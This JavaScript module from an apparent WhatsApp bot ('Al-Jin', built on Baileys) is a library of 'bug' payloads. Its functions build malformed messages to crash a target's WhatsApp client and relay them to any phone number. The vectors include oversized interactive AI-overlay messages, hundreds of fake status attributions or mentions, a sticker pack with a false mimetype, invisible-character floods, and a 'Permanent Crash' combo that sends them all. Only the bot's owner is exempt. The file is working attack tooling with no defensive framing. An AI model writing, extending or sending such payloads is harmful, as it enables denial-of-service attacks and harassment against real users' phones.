// ─────────────────────────────────────────────
// Al-Jin · lib/bug-payloads.js
// Native Baileys v7 ESM Bug & Crash Payload Library
// ─────────────────────────────────────────────
import crypto from 'node:crypto';
import { generateWAMessageFromContent, jidNormalizedUser } from '@whiskeysockets/baileys';
import { isOwner } from '../core/identity.js';

/**
 * Generates a standard message ID for Baileys relaying.
 */
export function generateMsgId(sock) {
  if (typeof sock?.generateMessageID === 'function') {
    try {
      return sock.generateMessageID();
    } catch (e) {}
  }
  return '3EB0' + crypto.randomBytes(8).toString('hex').toUpperCase();
}

/**
 * Check if the target JID is the bot itself or an owner number (safeguard).
 */
export function isProtectedJid(sock, targetJid) {
  if (!targetJid) return true;
  const cleanTarget = String(targetJid).split('@')[0].split(':')[0].replace(/[^0-9]/g, '');
  const botJid = sock?.user?.id ? jidNormalizedUser(sock.user.id) : '';
  const cleanBot = botJid.split('@')[0].split(':')[0].replace(/[^0-9]/g, '');

  if (cleanTarget === cleanBot) return true;
  if (isOwner(`${cleanTarget}@s.whatsapp.net`)) return true;

  return false;
}

/**
 * Safely relays a protobuf message payload to a target JID using native Baileys v7 methods.
 */
export async function relayNativePayload(sock, targetJid, messageContent) {
  if (isProtectedJid(sock, targetJid)) {
    throw new Error('Target is protected (Bot owner / self number safeguard active).');
  }

  const cleanTarget = targetJid.includes('@')
    ? targetJid
    : `${targetJid.replace(/[^0-9]/g, '')}@s.whatsapp.net`;

  try {
    const msgId = generateMsgId(sock);
    const waMsg = generateWAMessageFromContent(cleanTarget, messageContent, {
      userJid: sock.user?.id
    });

    await sock.relayMessage(cleanTarget, waMsg.message, { messageId: msgId });
    return { success: true, deliveredCount: 1, errors: [] };
  } catch (e1) {
    try {
      // Fallback via sock.sendMessage if relayMessage throws a transport exception
      await sock.sendMessage(cleanTarget, { forward: { key: { remoteJid: cleanTarget, id: generateMsgId(sock) }, message: messageContent } });
      return { success: true, deliveredCount: 1, errors: [] };
    } catch (e2) {
      return { success: false, deliveredCount: 0, errors: [e1.message, e2.message] };
    }
  }
}

// ─────────────────────────────────────────────
// 🧬 Crash Vectors (plan.txt & Baileys v7 Primitives)
// ─────────────────────────────────────────────

/**
 * 1. AI Rich Response (AddonAction) Malformation
 * Exploits client overlay renderer missing button object handling.
 */
export async function sendAIRichAddonAction(sock, targetJid) {
  const payload = {
    messageContextInfo: {
      messageSecret: crypto.randomBytes(32),
    },
    interactiveMessage: {
      body: { text: "🤖 Meta AI Assistant " + "ꦾ".repeat(500) },
      footer: { text: "System AI Response" },
      header: { title: "AI OVERLAY RESPONSE", hasSubtitle: true },
      nativeFlowResponseMessage: {
        name: "genai_footer_action",
        paramsJson: JSON.stringify({
          actionType: "GENAI_FOOTER_ACTION",
          primitives: [{ cta_text: "", footer_action_type: "" }]
        })
      },
      contextInfo: {
        forwardedAiBotMessageInfo: {
          botJid: "13135550202@bot",
          botName: "Business Assistant",
          creator: "FLIX"
        }
      }
    }
  };
  return relayNativePayload(sock, targetJid, payload);
}

/**
 * 2. QuotaUpsellSection THINK_HARD Trap
 * Triggers client parser discard & crash.
 */
export async function sendQuotaUpsellThinkHard(sock, targetJid) {
  const payload = {
    interactiveMessage: {
      body: { text: "⚡ Meta AI Plus Quota " + "ោ៝".repeat(500) },
      nativeFlowResponseMessage: {
        name: "quota_upsell",
        paramsJson: JSON.stringify({
          title: "Meta AI Premium",
          body: "Quota Limit Exceeded",
          meterUsageType: "META_AI_THINK_HARD",
          benefitType: "THINK_HARD",
          buttons: []
        })
      }
    }
  };
  return relayNativePayload(sock, targetJid, payload);
}

/**
 * 3. CrashJam Payload (StatusAttributions Overload)
 */
export async function sendCrashJamPayload(sock, targetJid) {
  const cleanUser = String(targetJid).split('@')[0].split(':')[0].replace(/[^0-9]/g, '');
  const targetBaseJid = `${cleanUser}@s.whatsapp.net`;

  const statusAttributions = Array.from({ length: 350 }, () => ({
    participant: `${Math.floor(10000000000 + Math.random() * 89999999999)}@s.whatsapp.net`,
    type: 1
  }));
  statusAttributions.unshift({ participant: targetBaseJid, type: 1 });

  const payload = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          contextInfo: {
            remoteJid: targetBaseJid,
            fromMe: true,
            isQuestion: true,
            statusAttributionType: 2,
            statusAttributions
          },
          body: {
            text: "⚡ CRASH JAM " + "ꦾ".repeat(1500),
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: JSON.stringify({ status: "active", code: "CRASH_JAM", overload: "ꦾ".repeat(1000) }),
            version: 3
          }
        }
      }
    }
  };
  return relayNativePayload(sock, targetJid, payload);
}

/**
 * 4. Killsystem Payload
 */
export async function sendKillSystemPayload(sock, targetJid) {
  const uw = "ꦾ".repeat(1000);
  const mentionedJid = [targetJid];
  for (let i = 0; i < 150; i++) {
    mentionedJid.push(`${Math.floor(10000000 + Math.random() * 89999999)}@s.whatsapp.net`);
  }

  const payload = {
    locationMessage: {
      degreesLatitude: -9.09999262999,
      degreesLongitude: 139.99963118999,
      name: "‼️ KILLSYSTEM OVERLOAD " + uw,
      contextInfo: {
        mentionedJid,
        externalAdReply: {
          title: "KILLSYSTEM OVERLOAD",
          body: uw,
          mediaType: "IMAGE"
        },
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    }
  };

  return relayNativePayload(sock, targetJid, payload);
}

/**
 * 5. CrashFinity Payload
 */
export async function sendCrashFinityPayload(sock, targetJid) {
  const payload = {
    viewOnceMessage: {
      message: {
        extendedTextMessage: {
          text: "💥 CRASHFINITY " + "ꦽ".repeat(2000),
          nativeFlowMessage: {
            buttons: [
              { name: "catalog_message", buttonParamsJson: JSON.stringify({ caption: "OVERLOAD " + "ꦽ".repeat(500) }) },
              { name: "cta_call", buttonParamsJson: JSON.stringify({ caption: "OVERLOAD " + "ꦽ".repeat(500) }) }
            ]
          }
        }
      }
    }
  };
  return relayNativePayload(sock, targetJid, payload);
}

/**
 * 6. StickerCrash Payload
 */
export async function sendStickerCrashPayload(sock, targetJid) {
  const repeatedText = "./StickerPack" + "؂ن؃؄ٽ؂ن؃".repeat(400);
  const payload = {
    stickerPackMessage: {
      stickerPackId: "SP_CRASH",
      name: repeatedText,
      publisher: repeatedText,
      packDescription: repeatedText,
      stickers: [
        { fileName: "sticker1.webp", isAnimated: false, mimetype: "application/pdf" },
        { fileName: "sticker2.webp", isAnimated: false, mimetype: "application/pdf" }
      ],
      stickerPackSize: "999999999",
      stickerPackOrigin: "1"
    }
  };
  return relayNativePayload(sock, targetJid, payload);
}

/**
 * 7. CallCrash Payload
 */
export async function sendCallCrashPayload(sock, targetJid) {
  const payload = {
    scheduledCallCreationMessage: {
      callType: 1,
      scheduledTimestampMs: Date.now() + 60000,
      title: "📞 EMERGENCY CALL " + "ꦾ".repeat(1000)
    }
  };
  return relayNativePayload(sock, targetJid, payload);
}

/**
 * 8. Xdelay / XBetaInvis / IosInvisible Payloads
 */
export async function sendXdelayPayload(sock, targetJid) {
  const payload = {
    extendedTextMessage: {
      text: "⏱️ DELAY PACKET " + "‎".repeat(5000) + "ꦾ".repeat(1000)
    }
  };
  return relayNativePayload(sock, targetJid, payload);
}

export async function sendIosInvisiblePayload(sock, targetJid) {
  const payload = {
    extendedTextMessage: {
      text: "🍎 IOS INVISIBLE " + "‌".repeat(8000) + "‍".repeat(8000)
    }
  };
  return relayNativePayload(sock, targetJid, payload);
}

/**
 * 9. Permanent Crash (Multi-Vector Combo)
 */
export async function sendPermanentCrashPayload(sock, targetJid) {
  let totalDelivered = 0;
  const errors = [];

  const vectors = [
    sendAIRichAddonAction,
    sendQuotaUpsellThinkHard,
    sendCrashJamPayload,
    sendKillSystemPayload,
    sendCrashFinityPayload,
    sendStickerCrashPayload,
    sendIosInvisiblePayload
  ];

  for (const fn of vectors) {
    try {
      const res = await fn(sock, targetJid);
      if (res?.success) totalDelivered += res.deliveredCount;
      else if (res?.errors) errors.push(...res.errors);
    } catch (e) {
      errors.push(e.message);
    }
  }

  return {
    success: totalDelivered > 0,
    deliveredCount: totalDelivered,
    errors
  };
}
